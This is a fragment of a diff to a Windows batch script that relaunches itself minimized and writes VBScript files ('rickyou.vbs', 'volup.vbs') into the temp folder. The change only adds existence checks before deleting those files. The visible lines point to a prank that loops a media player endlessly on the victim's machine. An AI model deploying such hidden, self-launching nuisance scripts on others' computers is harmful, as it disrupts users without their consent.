@@ -1,7 +1,11 @@
 if "%1" == "" start "" /min "%~dpnx0" MY_FLAG && exit
 @echo off
-del %tmp%\rickyou.vbs
+if exist "%tmp%\rickyou.vbs" (
+del %tmp%\rickyou.vbs 
+)
+if exist "%tmp%\volup.vbs" (
 del %tmp%\volup.vbs
+)
 cd %tmp%
 echo While true > rickyou.vbs
 echo Dim oPlayer >> rickyou.vbs
